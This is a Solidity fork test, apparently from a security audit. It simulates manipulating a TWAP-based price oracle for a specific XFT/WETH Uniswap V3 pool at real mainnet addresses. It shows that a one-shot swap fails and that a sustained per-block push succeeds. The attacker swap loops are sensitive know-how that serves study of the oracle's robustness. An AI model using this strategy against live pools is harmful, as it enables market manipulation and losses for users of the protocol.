// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {Mainnet, MainnetForkTest} from "./MainnetFork.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {IUniswapV3SwapCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";

interface IOracle {
    function getV3SqrtPrice(address uniswapV3Pool, uint32 intervalShort, uint32 intervalLong)
        external
        view
        returns (uint160 sqrtPriceX96);
}

IOracle constant ORACLE = IOracle(0x17881b9B731c78a546E5ab9dED28798b7C68CFA7);

contract UniswapV3ManipulateTest is MainnetForkTest, IUniswapV3SwapCallback {
    uint32 internal constant SHORT_INTERVAL = 180;
    uint32 internal constant LONG_INTERVAL = 1800;

    uint160 internal constant MAX_SQRT_PRICE_LIMIT = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;
    uint160 internal constant MIN_SQRT_PRICE_LIMIT = 4_295_128_740;

    IUniswapV3Pool public pool;
    address internal token0; // XFT
    address internal token1; // WETH

    function setUp() public override {
        super.setUp();
        pool = IUniswapV3Pool(0x701B319AFF36311F720f0a1ebD6636Dd84Bb3E8B);
        token0 = pool.token0();
        token1 = pool.token1();
        vm.label(address(pool), "XFT/WETH 0.3%");
        vm.label(address(ORACLE), "Oracle");
        vm.label(token0, "XFT");
        vm.label(token1, "WETH");
    }

    /// @inheritdoc IUniswapV3SwapCallback
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external override {
        if (msg.sender != address(pool)) revert();
        if (amount0Delta > 0) IERC20(token0).transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) IERC20(token1).transfer(msg.sender, uint256(amount1Delta));
    }

    /// The client is right: a one-shot "push the sqrt price up 3x" does NOT solve the task.
    ///
    /// getV3SqrtPrice = min(spot, short TWAP, long TWAP). A single swap moves ONLY spot; both TWAPs
    /// still sit at the old price, so the min - the oracle's actual output - barely moves. Tripling
    /// spot does not triple the oracle. To move the output you must move the (slow) long TWAP, which
    /// only happens if the price is SUSTAINED for the whole 1800s window. vm.warp with no trades fakes
    /// that by freezing the price for free - which is exactly what a TWAP exists to prevent - so the
    /// "3x after warp" number is an invalid lower bound, not a solution. The realistic solution is the
    /// bot scenario below (sustain every block; a sqrt-3x peak is not even enough, you need sqrt-9x).
    function test_OneShot3xPush_DoesNotMoveOracle() public {
        uint160 startOut = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        emit log_named_uint("start getV3SqrtPrice (sqrtPriceX96)", startOut);

        // One swap: push spot up toward 3x sqrt. (+0.1% buffer for tick flooring.)
        uint256 target = uint256(startOut) * 3 + uint256(startOut) / 1000;
        if (target >= MAX_SQRT_PRICE_LIMIT) target = MAX_SQRT_PRICE_LIMIT;
        uint256 wethBudget = 1e12 ether;
        deal(token1, address(this), wethBudget);
        pool.swap(address(this), false, int256(wethBudget), uint160(target), "");

        // Read in the SAME block - the realistic case (no free time-travel).
        (uint160 spotNow,,,,,,) = pool.slot0();
        uint160 outNow = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        emit log_named_uint("spot after push (x1000 of start)", uint256(spotNow) * 1000 / startOut); // ~3000
        emit log_named_uint("oracle output   (x1000 of start)", uint256(outNow) * 1000 / startOut); // ~1000

        // spot tripled, but the oracle output did NOT: min() is still pinned by the stale TWAPs.
        assertApproxEqRel(uint256(spotNow), uint256(startOut) * 3, 0.03e18); // spot ~3x
        assertLt(uint256(outNow), uint256(startOut) * 3 / 2); // output stays < 1.5x -> NOT solved by a 3x push

        // For contrast only: freezing the price for the full long window (unrealistic) is the ONLY way
        // this one swap would ever reach 3x. This is the invalid shortcut, shown here to make it explicit.
        vm.warp(block.timestamp + LONG_INTERVAL);
        uint160 outFrozen = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        emit log_named_uint("output after FREEZING 1800s (x1000, unrealistic)", uint256(outFrozen) * 1000 / startOut);
    }

    uint256 internal constant BLOCK_TIME = 12;

    uint160 internal _startOut;
    uint160 internal _peakSqrt;
    uint256 internal _lastXftOut;
    uint256 internal _attackerWethIn;
    uint256 internal _pushes;
    uint256 internal _crossedAt;
    uint160 internal _peakSpotSeen;

    /// @dev One attacker block: push spot UP to _peakSqrt, then read the oracle while spot is high.
    function _attackerBlock(uint256 elapsed) internal {
        uint256 wBefore = IERC20(token1).balanceOf(address(this));
        uint256 xBefore = IERC20(token0).balanceOf(address(this));
        pool.swap(address(this), false, int256(1e15 ether), _peakSqrt, "");
        _attackerWethIn += wBefore - IERC20(token1).balanceOf(address(this));
        _lastXftOut = IERC20(token0).balanceOf(address(this)) - xBefore;
        _pushes++;

        (uint160 spot,,,,,,) = pool.slot0();
        if (spot > _peakSpotSeen) _peakSpotSeen = spot;

        uint160 out = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        if (_crossedAt == 0 && uint256(out) >= uint256(_startOut) * 3) {
            _crossedAt = elapsed;
            emit log_named_uint(">>> reached 3x at t(s)", elapsed);
        }
    }

    function _runBotScenario(uint256 peakMultX1000, uint256 numBlocks) internal {
        _startOut = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        emit log_named_uint("peak push (sqrtPrice x1000 of start)", peakMultX1000);
        emit log_named_uint("start getV3SqrtPrice", _startOut);

        pool.increaseObservationCardinalityNext(400);

        uint256 target = uint256(_startOut) * peakMultX1000 / 1000;
        if (target >= MAX_SQRT_PRICE_LIMIT) target = MAX_SQRT_PRICE_LIMIT;
        _peakSqrt = uint160(target);

        deal(token1, address(this), 1e15 ether); // WETH for the attacker
        deal(token0, address(this), 1e30); // XFT inventory for the bot

        uint256 t0 = block.timestamp;
        for (uint256 i; i < numBlocks; i++) {
            vm.warp(t0 + BLOCK_TIME * (i + 1));
            if (i % 2 == 0) {
                _attackerBlock(block.timestamp - t0);
            } else if (_lastXftOut > 0) {
                pool.swap(address(this), true, int256(_lastXftOut), MIN_SQRT_PRICE_LIMIT, "");
            }
        }

        emit log_string("================ BOT SCENARIO RESULT ================");
        emit log_named_uint("peak spot reached (x1000 of start sqrtPrice)", uint256(_peakSpotSeen) * 1000 / _startOut);
        uint160 finalOut = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
        emit log_named_uint("final oracle out (x1000 of start)", uint256(finalOut) * 1000 / _startOut);
        if (_crossedAt == 0) {
            emit log_string(">>> 3x NEVER reached within the run");
        } else {
            emit log_named_uint(">>> time to 3x (seconds)", _crossedAt);
            emit log_named_uint(">>> time to 3x (blocks @12s)", _crossedAt / BLOCK_TIME);
        }
        emit log_named_uint("attacker pushes", _pushes);
        emit log_named_decimal_uint("attacker gross WETH pushed in (throughput)", _attackerWethIn, 18);
    }

    /// REALISTIC MODEL (this is the actual answer, not the frozen-price test above).
    ///
    /// The client's point: "pushing the sqrt price up 3x does not solve it" - correct, because the
    /// long TWAP is the time-average of the TICK, and a bot that reverses every block holds the price
    /// high only ~50% of the time. So a sqrt-3x peak averages out to only ~sqrt(3) (~1.73x) on the
    /// oracle and NEVER reaches 3x.
    function test_Bot_SamePeakCannotReach3x() public {
        _runBotScenario(3000, 200); // peak = sqrt-3x each block -> caps at ~1.73x, 3x never reached
    }

    /// To actually drive the oracle output to 3x against the 50%-duty bot, the per-block peak must be
    /// DOUBLE in tick terms = sqrt-9x (= 81x price), sustained for the full long window (~1800s), with
    /// the push repaid every block. That is the real cost of moving a TWAP.
    function test_Bot_DoublePeakReaches3x() public {
        _runBotScenario(9000, 200); // peak = sqrt-9x each block -> averages to 3x after ~1800s
    }
}
